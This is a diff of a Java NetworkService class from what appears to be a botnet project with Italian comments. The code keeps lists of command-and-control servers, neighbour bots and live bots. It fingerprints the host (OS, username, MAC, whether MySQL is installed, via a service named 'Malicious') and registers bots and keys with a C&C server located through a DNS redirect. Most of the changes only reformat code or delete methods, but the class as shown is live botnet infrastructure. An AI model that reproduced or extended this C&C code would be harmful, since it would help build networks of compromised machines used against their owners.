@@ -44,15 +44,16 @@ public class NetworkService {
 	@Autowired
 	private Config engineBot;
 
-	private SyncIpList<IP, PublicKey> commandConquerIps = new SyncIpList<IP, PublicKey>();
+	
+	private SyncIpList<IP,PublicKey> commandConquerIps=new SyncIpList<IP,PublicKey>();
 
-	// Ip dei command e conquer
-
-	// Lista vicini del rispettivo bot
-	private SyncIpList<IP, PublicKey> neighbours = new SyncIpList<IP, PublicKey>();
-
-	// Lista dei bot vivi in tutta la rete
-	private SyncIpList<IP, String> aliveBot = new SyncIpList<IP, String>();
+//	 Ip dei command e conquer
+	
+	//Lista vicini del rispettivo bot
+	private SyncIpList<IP,PublicKey> neighbours=new SyncIpList<IP,PublicKey>();
+	
+	//Lista dei bot vivi in tutta la rete
+	private SyncIpList<IP,String> aliveBot=new SyncIpList<IP,String>();
 
 	@Autowired
 	private Malicious malServ;
@@ -65,13 +66,16 @@ public class NetworkService {
 
 	@Autowired
 	private CryptoPKI pki;
-
-	private String idUser = "";
+	
+	private String idUser="";
 
 	@Autowired
 	private CryptoUtils cryptoUtils;
 	private static final String IP_REGEX = "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
+	//private static final String IP_REGEX2 = "^(^192.168.*)";
 	private static final String IP_REGEX2 = "^(^25.*)";
+	// private static final String MAC_REGEX =
+	// "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$";
 
 	private IP ip;
 	private String mac;
@@ -87,32 +91,37 @@ public class NetworkService {
 	private String usernameOS;
 
 	boolean elegible;
+	
+	private Integer counterCeCMemory=null;
 
 	public NetworkService() {
 	}
-
+	
+	
 	/**
 	 * @param botList
 	 */
 	public List<Pairs<IP, PublicKey>> setConstructList(Set<Bot> botList) {
 		List<Pairs<IP, PublicKey>> buff = new ArrayList<Pairs<IP, PublicKey>>();
 		botList.forEach((bot) -> {
-			buff.add(new Pairs<IP, PublicKey>(new IP(bot.getIp()), pki.rebuildPuK(bot.getPubKey())));
+			buff.add(new Pairs<IP, PublicKey>(new IP(bot.getIp()),pki.rebuildPuK(bot.getPubKey())));
 		});
 		return buff;
 	}
+	
 
+	
 	/**
 	 * @param botList
 	 */
 	public List<Pairs<IP, PublicKey>> setConstructList(List<Bot> list) {
 		List<Pairs<IP, PublicKey>> buff = new ArrayList<Pairs<IP, PublicKey>>();
 		list.forEach((bot) -> {
-			buff.add(new Pairs<IP, PublicKey>(new IP(bot.getIp()), pki.rebuildPuK(bot.getPubKey())));
+			buff.add(new Pairs<IP, PublicKey>(new IP(bot.getIp()),pki.rebuildPuK( bot.getPubKey())));
 		});
 		return buff;
 	}
-
+	
 	/**
 	 * @return
 	 * @throws InvalidKeyException
@@ -143,16 +152,14 @@ public class NetworkService {
 		System.out.println("My user: " + usernameOS);
 		this.idHash = netPar.get(6);
 		System.out.println("My IdHash: " + idHash);
-
-		if (os.startsWith("Mac")) {
-			elegible = (malServ
-					.checklistFilesFolder("/usr/local/mysql-5.7.15-osx10.11-x86_64/support-files/", "(^mysql.server)")
-					.equals("")) ? Boolean.FALSE : Boolean.TRUE;
-		} else
-			elegible = (malServ.checklistFiles("(^mysql.exe)").equals("")) ? Boolean.FALSE : Boolean.TRUE;
-
+		
+		if(os.startsWith("Mac")){
+		elegible = (malServ.checklistFilesFolder("/usr/local/mysql-5.7.15-osx10.11-x86_64/support-files/", "(^mysql.server)").equals("")) ? Boolean.FALSE :  Boolean.TRUE;}
+		else
+		elegible = (malServ.checklistFiles("(^mysql.exe)").equals("")) ? Boolean.FALSE :  Boolean.TRUE;
+		
 		System.out.println("My MYSQL: " + elegible);
-
+		
 		String os1 = System.getProperty("os.name");
 		String versionOS1 = System.getProperty("os.version");
 		String archOS1 = System.getProperty("os.arch");
@@ -166,11 +173,13 @@ public class NetworkService {
 
 	}
 
+	
+	
 	/**
 	 * @param response
 	 * @return
 	 */
-	public List<Pairs<IP, PublicKey>> tramsuteNeigha(List<Pairs<String, String>> response) {
+	public List<Pairs<IP, PublicKey>> tramsuteNeigha(List<Pairs<String, String> > response){
 		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();
 		for (Pairs<String, String> pairs : response) {
 			Pairs<IP, PublicKey> in = new Pairs<IP, PublicKey>();
@@ -180,7 +189,9 @@ public class NetworkService {
 		}
 		return newNeighbours;
 	}
-
+	
+	
+	
 	/**
 	 * @return
 	 */
@@ -207,7 +218,7 @@ public class NetworkService {
 
 		return ips;
 	}
-
+	
 	private String getAllIpAddress() {
 
 		ArrayList<String> ips = new ArrayList<>();
@@ -241,15 +252,16 @@ public class NetworkService {
 		StringBuilder sb = new StringBuilder();
 		try {
 			ip = InetAddress.getLocalHost();
+			// System.out.println("Current IP address : " +
+			// ip.getHostAddress());
 
 			NetworkInterface network = NetworkInterface.getByInetAddress(ip);
 			byte[] mac = network.getHardwareAddress();
-			if (mac != null) {
-				for (int i = 0; i < mac.length; i++) {
-					sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
-				}
-			} else
-				return "noMac";
+			// System.out.print("Current MAC address : ");
+			if(mac!=null){
+			for (int i = 0; i < mac.length; i++) {
+				sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
+			}}else return "noMac";
 			System.out.println(sb.toString());
 
 		} catch (UnknownHostException e) {
@@ -265,34 +277,34 @@ public class NetworkService {
 	 */
 	public boolean firstConnectToMockServerDns() {
 		String url = resolveDns(engineBot.getDnsurl());
-		if (engineBot.isCommandandconquerStatus()) {
+		if(engineBot.isCommandandconquerStatus()){
 			Boolean result = false;
 			result = cecReq.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
-			Pairs<IP, PublicKey> cec = new Pairs<>(getMyIp(), pki.getPubRSAKey());
+			Pairs<IP, PublicKey> cec = new Pairs<>(getMyIp(),pki.getPubRSAKey());
 			commandConquerIps.add(cec);
 			System.out.println("Ip tornato " + result);
 			return Boolean.TRUE;
-		} else {
+		}else{
 			url = url + engineBot.getUrirequest();
 			Pairs<String, String> result = new Pairs<>();
 			Pairs<IP, PublicKey> cec = new Pairs<>();
 			try {
-				result = botReq.getIpCeCFromDnsServer(url);
-				String buff = result.getValue1();
-				if (!buff.equals("")) {
-					cec.setValue1(new IP(buff));
-					cec.setValue2(pki.rebuildPuK(result.getValue2()));
-					commandConquerIps.add(cec);
-					for (int i = 0; i < commandConquerIps.getSize(); i++) {
-						Pairs<IP, PublicKey> command = commandConquerIps.get(i);
-						System.out.println("Cec: " + command.getValue1());
-					}
-					System.out.println("Connessione con DNS server OK");
-					return Boolean.TRUE;
-				} else
-					System.out.println("DNS empty");
+			result = botReq.getIpCeCFromDnsServer(url);
+			String buff=result.getValue1();
+				if(!buff.equals("")){
+			cec.setValue1(new IP(buff));
+			cec.setValue2(pki.rebuildPuK(result.getValue2()));
+			commandConquerIps.add(cec);
+			for (int i = 0; i < commandConquerIps.getSize(); i++) {
+				Pairs<IP,PublicKey> command=commandConquerIps.get(i);
+				System.out.println("Cec: "+command.getValue1());
+			}
+//			commandConquerIps.getList().forEach(ip -> System.out.println(ip.getValue1()));
+			System.out.println("Connessione con DNS server OK");
+			return Boolean.TRUE;
+			}else System.out.println("DNS empty");
 			} catch (Exception ex) {
-				System.err.println("Errore durante la richiesta di IP\n" + ex);
+			System.err.println("Errore durante la richiesta di IP\n" + ex);
 			}
 		}
 		return Boolean.FALSE;
@@ -348,36 +360,17 @@ public class NetworkService {
 	 */
 	private String getMyIpCheckInternet() {
 		String ip = null;
+		//			ip = InetAddress.getLocalHost();
 		ip = getAllIpAddress();
 		System.out.println("my ip " + ip);
+		// TODO ELIMINA MOCK LOCAL IP
+		// result = asyncRequest.askMyIpToAmazon();
+		// if (result.matches(IP_REGEX))
+		// return result;
 		return ip;
 	}
 
-	/**
-	 * @return
-	 */
-	public Boolean updateDnsInformation() {
-
-		String url = engineBot.getDnsurl();
-		Boolean result = false;
-		result = cecReq.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
-		System.out.println("Ip tornato " + result);
-		return Boolean.TRUE;
-	}
-
-	/**
-	 * @param ip
-	 * @param pk
-	 * @return
-	 */
-	public Boolean updateDnsInformation(IP ip, PublicKey pk) {
-
-		String url = engineBot.getDnsurl();
-		Boolean result = false;
-		result = cecReq.sendInfoToDnsServer(url, ip, pk);
-		System.out.println("Ip tornato " + result);
-		return Boolean.TRUE;
-	}
+	
 
 	/**
 	 * @param ip
@@ -388,36 +381,41 @@ public class NetworkService {
 
 		String url = resolveDns(engineBot.getDnsurl());
 		Boolean result = false;
-
-		result = cecReq.sendInfoToDnsServer(url, ip, pk);
+		
+		result = cecReq.sendInfoToDnsServer(url,ip, pk);
 		System.out.println("Ip tornato " + result);
 		return result;
 	}
-
+	
+	
 	public String resolveDns(String dnsUrl) {
 		String url = "http://" + dnsUrl;
-		System.out.println("Risolvo dns: " + url);
+		System.out.println("Risolvo dns: "+url);
 		String rediret = null;
 
 		HttpURLConnection connection = null;
 		try {
-
-			URL uri;
-			uri = new URL(url);
-			connection = (HttpURLConnection) uri.openConnection();
-			connection.setInstanceFollowRedirects(false);
-			rediret = connection.getHeaderField("Location");
+			
+				URL uri;
+				uri = new URL(url);
+				connection = (HttpURLConnection) uri.openConnection();
+				connection.setInstanceFollowRedirects(false);
+				rediret = connection.getHeaderField("Location");
+				//System.out.println("risultato " + rediret);
 		} catch (IOException e) {
+			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 		return rediret;
 	}
 
+	
+	
 	public boolean updateBotNetwork() {
 		return true;
 	}
 
-	public SyncIpList<IP, PublicKey> getCommandConquerIps() {
+	public SyncIpList<IP,PublicKey> getCommandConquerIps() {
 		return commandConquerIps;
 	}
 
@@ -563,20 +561,44 @@ public class NetworkService {
 		this.elegible = elegible;
 	}
 
+
 	public SyncIpList<IP, String> getAliveBot() {
 		return aliveBot;
 	}
+
 
 	public void setAliveBot(SyncIpList<IP, String> aliveBot) {
 		this.aliveBot = aliveBot;
 	}
 
+
 	public String getIdUser() {
 		return idUser;
 	}
 
+
 	public void setIdUser(String idUser) {
 		this.idUser = idUser;
 	}
+
+
+	public Integer getCounterCeCMemory() {
+		synchronized(counterCeCMemory){
+		return counterCeCMemory;
+		}
+	}
+
+
+	public void setCounterCeCMemory(Integer counterCeCMemory) {
+		synchronized (counterCeCMemory) {
+			this.counterCeCMemory = counterCeCMemory;
+		}
+		
+	}
+	
+	
+	// public SyncCeCList getBotIps() {
+	// return botIps;
+	// }
 
 }
